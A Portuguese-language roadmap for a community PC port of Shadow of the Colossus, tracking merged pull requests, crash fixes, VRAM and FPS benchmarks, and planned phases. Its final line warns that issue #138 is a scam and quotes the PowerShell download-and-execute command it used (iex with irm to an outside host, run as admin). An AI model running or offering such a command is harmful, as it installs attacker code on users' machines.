# Roadmap — Shadow of the Colossus PC

Atualizado a cada correção. Legenda: ✅ feito · 🔧 em andamento · ⏳ pendente

**Estratégia (19/10/2026):** integrar e testar as pull requests e forks da comunidade em vez de refazer
o trabalho. Branch local `comunidade` = `main` (0.57) + PRs integradas. As correções equivalentes que
fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em hardware que não temos).

## Fase 0 — Integração da comunidade

| # | Item | Estado | Notas |
|---|---|---|---|
| 0.1 | PRs pequenas do Lucas-blip-png: #46, #47, #52, #53, #106, #108 | ✅ | #48, #105 e #107 já cobertas pela #98. #47 com conflito resolvido (RTZ na NVIDIA + pacote tipo 2). |
| 0.2 | #98 (Gabriell-os): AMD + #32 + #59 + #83 (Oussama268) | ✅ | Wave64 uniforme na AMD, blocos de 64 MiB na arena, fila de avisos que cresce, cache de formatos, readbacks assíncronos etc. |
| 0.3 | #103 (Oussama268): cortes no processador de comandos, liberação de VRAM fria | ✅ | `00fe449`. Conflito com a #98 na arena: mantidos os blocos de 64 MiB; a liberação passou a ser por trecho residente (com releitura e comparação). Teste forçado (`SOTC_ARENA_EVICT_MB=256`): 10 min, 1,5 GB liberados em 118 passadas, 0 erros, VRAM 2,7 GB (antes ~4,3). Benchmark com cache pronto: **62,6 FPS média, 30,9 mínima** (antes ~54–55 e ~26). |
| 0.4 | #81 (jownatan): Intel Arc B580 | ✅ | Só as partes exclusivas (a compilação em segundo plano e a pré-carga já vieram, para todas as GPUs, pela #83): trava de regiões sem deadlock no Windows, `SotC-Shaders.ps1`, e a espera da thread de gravação como opção `SOTC_REC_SLEEP_US` (2 ms fixos custavam 6% no desktop: 57,7 vs 61,1 FPS; notebooks/APUs: `2000`). |
| 0.5 | #69 (DUDUYG): menos CPU por draw, thread de preparação de draws | ⏳ decisão | Conflita com a linha do Oussama em 31 arquivos (~110 trechos). A medição anterior (56,9 / 41,2) **não vale**: no build da #69 o jogo pula a intro e cai num demo diferente (Wander montado, dicas de tutorial), mais leve na ponte. Mesmo demo sem DMA no `comunidade`: 61 / 26–27 (DMA não muda o pior trecho). Ganho documentado pelo autor (PC dele): preparação de draws +3,6% média / +10% trecho pesado; memos −6 a −11% de CPU por comando; parte se sobrepõe aos cortes do Oussama. |
| 0.6 | Fork xeodeo `v0.57-fixed.1`: bloco preto da AMD RDNA3/4 (#43), BC5/BC6H sem storage, gravação Vulkan sem girar 100% | ⏳ | github.com/xeodeo/ShadowOfTheColossus-PC-FIXED |
| 0.7 | Fork nakaionyt `v0.57-fg2`: geração de quadros (DLSS-G / FSR 3, jogo a 30 → 60 na tela), sombras distantes reaproveitadas (+17–22%), ritmo de quadros | ⏳ | github.com/nakaionyt/ShadowOfTheColossus-PC-FrameGen. Alternativa ao modo 60 FPS (fase 2) sem quebrar a física. |
| 0.8 | Demais PRs (#94 menu, #54 widescreen, #118 F11, #130/#39 Linux, #99/#132 refatoração grande do CP) | ⏳ | Avaliar uma a uma. |
| 0.9 | Corrigir autor dos commits 1bb9dd5/83f88ff (branch `ajncsystem-estabilidade-fps`, PR #93) | ⏳ | |

## Fase 1 — Estabilidade (quedas e travamentos)

| # | Item | Estado | Notas |
|---|---|---|---|
| 1 | Jogo congela ("STOP: GPU hook queue overflow") | ✅ | Na #98 (Gabriell-os `3394cd0`); eu tinha feito igual (`c69befb`, branch `sotc`). |
| 2 | Limite de alocações de VRAM (`EnsureResident: Assertion Failed`, AMD) | ✅ | Na #98 (blocos de 64 MiB, `9563b7d`); igual ao meu `c69befb`. |
| 3 | Liberar VRAM sem uso (placas de 4–6 GB) | ✅ | Da #103, adaptada aos blocos (0.3). Meu `1b62560` fica de fora: não comparava a arena com a memória do jogo antes de liberar (risco de cenas apagadas, achado do Oussama). |
| 4 | Fault 0x1a371 no modo PS4 Pro (após 1º/2º colosso) | ✅ | PR #106 (+640 MiB no modo Pro); mesma conclusão que a minha (`c2614b0`/`7d9ee11`). |
| 4b | Streaming de texturas desligado sem querer desde a v0.0.13 | ⏳ | `sotc_lod_stats.h`: `idle < linger` com `linger = 0` nunca é verdadeiro. Com `<=`: 10+15 min normal e 7,5 min Pro sem queda; falta carregar um save com ele ligado. |
| 5 | Queda na intro final | ⏳ | Aguardando log/cena do usuário. |
| 6 | Release v0.58 | ⏳ | Precisa de aprovação. |

## Fase 2 — Modo 60 FPS

| # | Item | Estado | Notas |
|---|---|---|---|
| 7 | Física/tempo no dobro: parede do 2º colosso (#120), colossos voando (#100), queda na ponte (#63) | ⏳ | Ver 0.7 (30 FPS + geração de quadros). |

## Fase 3 — AMD e outras GPUs

| # | Item | Estado | Notas |
|---|---|---|---|
| 8 | AMD (#122, #87, #86, #82, #43), GTX 1060/1070 (#102, #68), Intel Arc (#16) | 🔧 | #98 integrada; faltam 0.4 e 0.6. |

## Fase 4 — Desempenho

| # | Item | Estado | Notas |
|---|---|---|---|
| 9 | Processador de comandos (meta 40–60 FPS estáveis) | 🔧 | #59/#83/#103 integradas (+10% no demo); falta 0.5 (#69). |
| 10 | FPS baixo em PCs fortes (#129), templo (#14) | ⏳ | |

## Fase 5 — Extras

| # | Item | Estado | Notas |
|---|---|---|---|
| 11 | Pré-compilar shaders (#124), auto-update (#136), versão sem AVX2 (#70, #89, #88) | ⏳ | #83 já lê os caches em paralelo (50 s → 0,9 s) e compila pipelines em segundo plano. |

## Fora do roteiro

- Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
